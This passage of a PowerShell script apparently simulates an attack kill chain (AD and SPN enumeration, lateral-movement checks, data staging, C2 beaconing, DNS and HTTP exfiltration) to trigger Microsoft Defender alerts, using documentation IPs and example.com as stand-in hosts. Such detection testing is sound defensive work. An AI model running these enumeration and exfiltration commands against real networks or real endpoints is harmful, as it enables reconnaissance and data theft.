            Write-StepResult "  ... and $($spnResults.Count - 5) more SPN accounts" -Status Info
        }
        $spnResults.Dispose()
    }
    catch {
        Write-StepResult "SPN query failed: $($_.Exception.Message)" -Status Warning
    }
    Write-ExpectedAlert "Kerberoasting reconnaissance / SPN enumeration"
    Add-LogEntry "AccountEnum: SPN enumeration executed against $dc"

    # --- T1016: System Network Configuration Discovery ---
    Write-Phase -TacticId "TA0007" -TacticName "Discovery" `
                -TechniqueId "T1016" -TechniqueName "System Network Configuration: Domain Trust" `
                -Description "Enumerating domain trusts via nltest.`nAttackers map trust relationships to plan lateral movement across domains."

    Write-StepResult "Enumerating domain trusts via nltest..." -Status Info
    $trustOutput = nltest /domain_trusts /all_trusts 2>&1 | Out-String
    Write-Host $trustOutput -ForegroundColor DarkGray
    Write-StepResult "Domain trust enumeration complete" -Status Success

    Write-StepResult "Querying DC info via nltest..." -Status Info
    $dcInfoOutput = nltest /dsgetdc:$dc 2>&1 | Out-String
    Write-Host $dcInfoOutput -ForegroundColor DarkGray
    Write-StepResult "DC info query complete" -Status Success

    Write-ExpectedAlert "Domain trust enumeration / nltest reconnaissance"
    Add-LogEntry "AccountEnum: nltest domain trust enumeration executed"

    # --- T1033: System Owner/User Discovery ---
    Write-Phase -TacticId "TA0007" -TacticName "Discovery" `
                -TechniqueId "T1033" -TechniqueName "System Owner/User Discovery" `
                -Description "Querying currently logged-on users and domain password policy.`nAttackers check password policies to optimize brute-force attacks."

    Write-StepResult "Querying domain password policy..." -Status Info
    $policyOutput = net accounts /domain 2>&1 | Out-String
    Write-Host $policyOutput -ForegroundColor DarkGray
    Write-StepResult "Password policy enumeration complete" -Status Success

    Write-ExpectedAlert "Domain password policy enumeration"
    Add-LogEntry "AccountEnum: Password policy queried"

    Pause-IfInteractive
}

# ============================================================================
# Phase 9: Lateral Movement (TA0008)
# ============================================================================

function Invoke-LateralMovement {
    Write-Banner "PHASE 9: LATERAL MOVEMENT (TA0008)"

    # --- T1021.006: Remote Services - WinRM ---
    Write-Phase -TacticId "TA0008" -TacticName "Lateral Movement" `
                -TechniqueId "T1021.006" -TechniqueName "Remote Services: Windows Remote Management" `
                -Description "Testing WinRM connectivity to localhost (safe self-connection test).`nAttackers use WinRM for lateral movement between hosts."

    Write-StepResult "Testing WinRM service status..." -Status Info

    try {
        $winrmStatus = Get-Service WinRM -ErrorAction SilentlyContinue
        Write-StepResult "WinRM Service Status: $($winrmStatus.Status)" -Status Info

        # Test connection to localhost - triggers WinRM lateral movement detection
        Test-WSMan -ComputerName localhost -ErrorAction SilentlyContinue | Out-Null
        Write-StepResult "WinRM test to localhost completed" -Status Success
    }
    catch {
        Write-StepResult "WinRM test: $($_.Exception.Message)" -Status Warning
    }

    Write-ExpectedAlert "WinRM lateral movement attempt"
    Add-LogEntry "LateralMovement: WinRM tested"

    # --- T1021.002: SMB/Windows Admin Shares ---
    Write-Phase -TacticId "TA0008" -TacticName "Lateral Movement" `
                -TechniqueId "T1021.002" -TechniqueName "Remote Services: SMB/Windows Admin Shares" `
                -Description "Enumerating local SMB shares (read-only).`nAttackers enumerate shares to find accessible resources on remote hosts."

    Write-StepResult "Enumerating SMB shares..." -Status Info

    $shares = Get-SmbShare -ErrorAction SilentlyContinue | Select-Object Name, Path, Description
    if ($shares) {
        $shares | Format-Table -AutoSize | Out-String | Write-Host
    }
    Write-StepResult "SMB share enumeration complete" -Status Success

    Write-ExpectedAlert "SMB share enumeration detected"
    Add-LogEntry "LateralMovement: SMB shares enumerated"

    Pause-IfInteractive
}

# ============================================================================
# Phase 10: Collection (TA0009)
# ============================================================================

function Invoke-Collection {
    Write-Banner "PHASE 10: COLLECTION (TA0009)"

    # --- T1560.001: Archive Collected Data ---
    Write-Phase -TacticId "TA0009" -TacticName "Collection" `
                -TechniqueId "T1560.001" -TechniqueName "Archive Collected Data: Archive via Utility" `
                -Description "Creating a compressed archive of staged test files.`nAttackers compress data before exfiltration to reduce size and evade DLP."

    Write-StepResult "Creating test files for staging..." -Status Info

    # Create some fake "sensitive" files
    $stagingDir = "$script:TestDir\staging"
    New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
    $script:ArtifactsCreated += $stagingDir

    @("financial-report-Q4.docx", "employee-list.csv", "network-diagram.pdf", "credentials-backup.txt") | ForEach-Object {
        $filePath = "$stagingDir\$_"
        "DEMO: This is a safe test file for MDE alert simulation - $_" | Out-File $filePath -Force
        $script:ArtifactsCreated += $filePath
    }

    Write-StepResult "Compressing staged files..." -Status Info

    $archivePath = "$script:TestDir\exfil-package.zip"
    Compress-Archive -Path "$stagingDir\*" -DestinationPath $archivePath -Force
    $script:ArtifactsCreated += $archivePath

    $archiveSize = (Get-Item $archivePath).Length
    Write-StepResult "Archive created: $archivePath ($archiveSize bytes)" -Status Success

    Write-ExpectedAlert "Data staging and archival activity"
    Add-LogEntry "Collection: Test data archived"

    # --- T1074.001: Data Staged: Local Data Staging ---
    Write-Phase -TacticId "TA0009" -TacticName "Collection" `
                -TechniqueId "T1074.001" -TechniqueName "Data Staged: Local Data Staging" `
                -Description "Copying multiple files to a single staging directory.`nThis consolidation pattern is a pre-exfiltration indicator."

    Write-StepResult "Data staging simulation complete" -Status Success
    Write-ExpectedAlert "Local data staging detected"
    Add-LogEntry "Collection: Data staging completed"

    Pause-IfInteractive
}

# ============================================================================
# Phase 11: Command & Control (TA0011)
# ============================================================================

function Invoke-CommandAndControl {
    Write-Banner "PHASE 11: COMMAND `& CONTROL (TA0011)"

    # --- T1071.001: Application Layer Protocol - Web ---
    Write-Phase -TacticId "TA0011" -TacticName "Command and Control" `
                -TechniqueId "T1071.001" -TechniqueName "Application Layer Protocol: Web Protocols" `
                -Description "Making HTTP requests to known Microsoft test/documentation IPs.`nThis simulates C2 beacon behavior without contacting actual malicious infrastructure."

    Write-StepResult "Simulating outbound HTTP beacon pattern..." -Status Info

    # Use safe documentation-range IPs (RFC 5737: 203.0.113.0/24)
    # These are TEST-NET-3 addresses that don't route anywhere
    $testEndpoints = @(
        @{ Url = "http://203.0.113.1/beacon"; Desc = "TEST-NET-3 (RFC 5737)" },
        @{ Url = "http://192.0.2.1/update"; Desc = "TEST-NET-1 (RFC 5737)" },
        @{ Url = "http://198.51.100.1/check"; Desc = "TEST-NET-2 (RFC 5737)" }
    )

    foreach ($ep in $testEndpoints) {
        Write-StepResult "Beacon attempt -> $($ep.Url) [$($ep.Desc)]" -Status Info
        try {
            $null = Invoke-WebRequest -Uri $ep.Url -TimeoutSec 2 -ErrorAction SilentlyContinue
        }
        catch {
            Write-StepResult "Connection failed (expected - non-routable test IPs)" -Status Info
        }
    }

    Write-ExpectedAlert "Suspicious outbound connection pattern"
    Add-LogEntry "C2: Outbound beacon pattern simulated"

    # --- T1132.001: Data Encoding ---
    Write-Phase -TacticId "TA0011" -TacticName "Command and Control" `
                -TechniqueId "T1132.001" -TechniqueName "Data Encoding: Standard Encoding" `
                -Description "Encoding data in Base64 for C2 communication simulation.`nAttackers encode C2 traffic to evade network inspection."

    Write-StepResult "Encoding simulated C2 payload..." -Status Info

    $c2Payload = @{
        type    = "beacon"
        host    = $env:COMPUTERNAME
        user    = $env:USERNAME
        time    = (Get-Date).ToString("o")
        message = "MDE-Demo: Safe C2 simulation"
    } | ConvertTo-Json

    $encodedPayload = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($c2Payload))
    Write-StepResult "Encoded C2 payload ($($encodedPayload.Length) chars)" -Status Info

    # Write to file (simulates C2 data drop)
    $c2File = "$script:TestDir\c2-beacon-log.b64"
    $encodedPayload | Out-File $c2File -Force
    $script:ArtifactsCreated += $c2File

    Write-ExpectedAlert "Encoded data communication pattern"
    Add-LogEntry "C2: Encoded beacon payload created"

    Pause-IfInteractive
}

# ============================================================================
# Phase 12: Exfiltration (TA0010)
# ============================================================================

function Invoke-Exfiltration {
    Write-Banner "PHASE 12: EXFILTRATION (TA0010)"

    # --- T1048.003: Exfiltration Over Unencrypted Protocol ---
    Write-Phase -TacticId "TA0010" -TacticName "Exfiltration" `
                -TechniqueId "T1048.003" -TechniqueName "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol" `
                -Description "Attempting DNS-based data exfiltration using nslookup.`nDNS tunneling is a common exfiltration technique. Uses safe test domains."

    Write-StepResult "Simulating DNS-based exfiltration..." -Status Info

    # Encode small data in DNS queries (to non-existent subdomains of safe domains)
    $exfilData = [Convert]::ToBase64String(
        [System.Text.Encoding]::UTF8.GetBytes("demo-$env:COMPUTERNAME")
    ).Replace("=", "").Replace("+", "-").Replace("/", "_").Substring(0, [Math]::Min(30, 50))

    # Use example.com (RFC 2606 - reserved for documentation)
    $dnsQueries = @(
        "$exfilData.exfil-test.example.com",
        "beacon-$(Get-Random -Maximum 9999).example.com",
        "data-chunk-1.example.com"
    )

    foreach ($query in $dnsQueries) {
        Write-StepResult "DNS query: $query" -Status Info
        nslookup $query 2>&1 | Out-Null
    }

    Write-StepResult "DNS exfiltration simulation complete" -Status Success
    Write-ExpectedAlert "Suspicious DNS query pattern / DNS tunneling"
    Add-LogEntry "Exfiltration: DNS tunneling simulated"

    # --- T1041: Exfiltration Over C2 Channel ---
    Write-Phase -TacticId "TA0010" -TacticName "Exfiltration" `
                -TechniqueId "T1041" -TechniqueName "Exfiltration Over C2 Channel" `
                -Description "Simulating data exfiltration via HTTP POST to a test IP.`nUses RFC 5737 documentation IP - no data leaves the network."

    Write-StepResult "Simulating HTTP exfiltration attempt..." -Status Info

    try {
        $exfilPayload = @{
            hostname = $env:COMPUTERNAME
            data     = "MDE-Demo-Safe-Exfil-Test"
        } | ConvertTo-Json

        Invoke-WebRequest -Uri "http://203.0.113.50/upload" `
            -Method POST -Body $exfilPayload -TimeoutSec 2 `
            -ErrorAction SilentlyContinue | Out-Null
    }
    catch {
        Write-StepResult "HTTP POST failed (expected - RFC 5737 test IP)" -Status Info
    }

    Write-ExpectedAlert "Data exfiltration attempt over HTTP"
    Add-LogEntry "Exfiltration: HTTP exfil simulated"

    Pause-IfInteractive
}

# ============================================================================
# Cleanup
# ============================================================================

function Invoke-Cleanup {
    Write-Banner "CLEANUP: REMOVING ALL TEST ARTIFACTS"

    if ($SkipCleanup) {
        Write-StepResult "Cleanup skipped (-SkipCleanup flag set)" -Status Warning
        Write-StepResult "Artifacts location: $script:TestDir" -Status Info
        return
    }

    Write-StepResult "Cleaning up $($script:ArtifactsCreated.Count) artifacts..." -Status Info

    # Remove registry entries
    $script:ArtifactsCreated | Where-Object { $_ -like "REG:*" } | ForEach-Object {
        $parts = $_ -replace "^REG:", "" -split "\\"
        $regKey = ($parts[0..($parts.Length - 2)] -join "\")
        $regName = $parts[-1]
        Remove-ItemProperty -Path $regKey -Name $regName -Force -ErrorAction SilentlyContinue
        Write-StepResult "Removed registry key: $regName" -Status Success
    }

    # Remove scheduled tasks
    $script:ArtifactsCreated | Where-Object { $_ -like "TASK:*" } | ForEach-Object {
        $taskName = $_ -replace "^TASK:", ""
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        Write-StepResult "Removed scheduled task: $taskName" -Status Success
    }

    # Remove test directory and all contents
    if (Test-Path $script:TestDir) {
        Remove-Item $script:TestDir -Recurse -Force -ErrorAction SilentlyContinue
        Write-StepResult "Removed test directory: $script:TestDir" -Status Success
    }

    Write-StepResult "All artifacts cleaned up" -Status Success
}

# ============================================================================
# Summary Report
# ============================================================================

function Show-Summary {
    Write-Banner "SIMULATION SUMMARY"

    Write-Host "  Kill Chain Phases Executed:" -ForegroundColor White
    Write-Host ""
    Write-Host "    Phase                   MITRE Tactic    Expected Alerts" -ForegroundColor Gray
    Write-Host "    -----                   ------------    ---------------" -ForegroundColor DarkGray

    $phases = @(
        @{ Name = "Reconnaissance";       Id = "TA0043" },
        @{ Name = "Initial Access";       Id = "TA0001" },
        @{ Name = "Execution";            Id = "TA0002" },
        @{ Name = "Persistence";          Id = "TA0003" },
        @{ Name = "Privilege Escalation"; Id = "TA0004" },
        @{ Name = "Defense Evasion";      Id = "TA0005" },
        @{ Name = "Credential Access";    Id = "TA0006" },
        @{ Name = "Discovery";            Id = "TA0007" },
        @{ Name = "AD Account Enum";      Id = "TA0007" },
        @{ Name = "Lateral Movement";     Id = "TA0008" },
        @{ Name = "Collection";           Id = "TA0009" },
        @{ Name = "Command `& Control";    Id = "TA0011" },
        @{ Name = "Exfiltration";         Id = "TA0010" }
    )

    foreach ($p in $phases) {
        $nameFormatted = $p.Name.PadRight(24)
        Write-Host "    $nameFormatted$($p.Id)" -ForegroundColor Cyan
    }

    Write-Host ""
    Write-Host "  Total Expected Alerts: $($script:AlertsTriggered.Count)" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  Expected alerts in Defender:" -ForegroundColor White
    $script:AlertsTriggered | ForEach-Object { Write-Host "    - $_" -ForegroundColor Gray }

    Write-Host ""
    Write-Host "  +----------------------------------------------------------------------+" -ForegroundColor Green
    Write-Host "  |  Next Steps:                                                       |" -ForegroundColor Green
    Write-Host "  |                                                                    |" -ForegroundColor Green
    Write-Host "  |  1. Open Microsoft Defender Security Center                        |" -ForegroundColor Green
    Write-Host "  |     https://security.microsoft.com                                 |" -ForegroundColor Green
    Write-Host "  |                                                                    |" -ForegroundColor Green
    Write-Host "  |  2. Navigate to: Incidents and Alerts > Alerts                     |" -ForegroundColor Green
    Write-Host "  |     Alerts may take 5-30 minutes to appear                         |" -ForegroundColor Green
    Write-Host "  |                                                                    |" -ForegroundColor Green
    Write-Host "  |  3. Look for alerts from this machine:                             |" -ForegroundColor Green
    $machName = $env:COMPUTERNAME.PadRight(53)
    Write-Host "  |     $machName|" -ForegroundColor Green
    Write-Host "  |                                                                    |" -ForegroundColor Green
    Write-Host "  |  4. Check the MITRE ATT+CK mapping in each alert                  |" -ForegroundColor Green
    Write-Host "  |                                                                    |" -ForegroundColor Green
    Write-Host "  |  5. If using Microsoft Sentinel, check:                            |" -ForegroundColor Green
    Write-Host "  |     - SecurityAlert table                                          |" -ForegroundColor Green
    Write-Host "  |     - SecurityIncident table                                       |" -ForegroundColor Green
    Write-Host "  |     - DeviceEvents / DeviceProcessEvents tables                    |" -ForegroundColor Green
    Write-Host "  +----------------------------------------------------------------------+" -ForegroundColor Green
    Write-Host ""
}

# ============================================================================
# Main Execution
# ============================================================================

Write-Host ""
Write-Host "  ======================================================================" -ForegroundColor Red
Write-Host "  ||                                                                  ||" -ForegroundColor Red
Write-Host "  ||   MICROSOFT DEFENDER FOR ENDPOINT - SAFE ALERT SIMULATION        ||" -ForegroundColor Red
Write-Host "  ||                                                                  ||" -ForegroundColor Red
Write-Host "  ||   This script generates REAL alerts in Defender using safe,       ||" -ForegroundColor Red
Write-Host "  ||   non-destructive techniques mapped to the MITRE ATT+CK          ||" -ForegroundColor Red
Write-Host "  ||   framework.                                                     ||" -ForegroundColor Red
Write-Host "  ||                                                                  ||" -ForegroundColor Red
Write-Host "  ||   No malware is used. No damage is caused. All artifacts are     ||" -ForegroundColor Red
Write-Host "  ||   cleaned up automatically after execution.                      ||" -ForegroundColor Red
Write-Host "  ||                                                                  ||" -ForegroundColor Red
$machinePad = $env:COMPUTERNAME.PadRight(47)
$userPad    = $env:USERNAME.PadRight(47)
$dateFormat = "yyyy-MM-dd HH:mm:ss"
$datePad    = (Get-Date -Format $dateFormat).PadRight(47)
Write-Host "  ||   Machine:  $machinePad||" -ForegroundColor Red
Write-Host "  ||   User:     $userPad||" -ForegroundColor Red
Write-Host "  ||   Date:     $datePad||" -ForegroundColor Red
Write-Host "  ||                                                                  ||" -ForegroundColor Red
Write-Host "  ======================================================================" -ForegroundColor Red
Write-Host ""

if (-not $NoPause) {
    Write-Host "  Press any key to start the simulation..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# Check for admin (some tests work better elevated)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)
if (-not $isAdmin) {
    Write-Host ""
    Write-Host "  [!] Running without Administrator privileges." -ForegroundColor Yellow
    Write-Host "  [!] Some alerts may not trigger. For full coverage, run as Admin." -ForegroundColor Yellow
    Write-Host ""
}

# Initialize
Initialize-TestEnvironment

# Execute phases
$phaseMap = @{
    "Reconnaissance"      = { Invoke-Reconnaissance }
    "InitialAccess"       = { Invoke-InitialAccess }
    "Execution"           = { Invoke-Execution }
    "Persistence"         = { Invoke-Persistence }
    "PrivilegeEscalation" = { Invoke-PrivilegeEscalation }
    "DefenseEvasion"      = { Invoke-DefenseEvasion }
    "CredentialAccess"    = { Invoke-CredentialAccess }
    "Discovery"           = { Invoke-Discovery }
    "AccountEnumeration"  = { Invoke-AccountEnumeration }
    "LateralMovement"     = { Invoke-LateralMovement }
    "Collection"          = { Invoke-Collection }
    "CommandAndControl"   = { Invoke-CommandAndControl }
    "Exfiltration"        = { Invoke-Exfiltration }
}

if ($Phase -eq "All") {
    foreach ($key in @(
        "Reconnaissance", "InitialAccess", "Execution", "Persistence",
        "PrivilegeEscalation", "DefenseEvasion", "CredentialAccess",
        "Discovery", "AccountEnumeration", "LateralMovement", "Collection",
        "CommandAndControl", "Exfiltration"
    )) {
        & $phaseMap[$key]
    }
}
else {
    & $phaseMap[$Phase]
}

# Cleanup and Summary
Invoke-Cleanup
Show-Summary

Write-Host "  Simulation complete. Check Microsoft Defender Security Center for alerts." -ForegroundColor Green
Write-Host ""
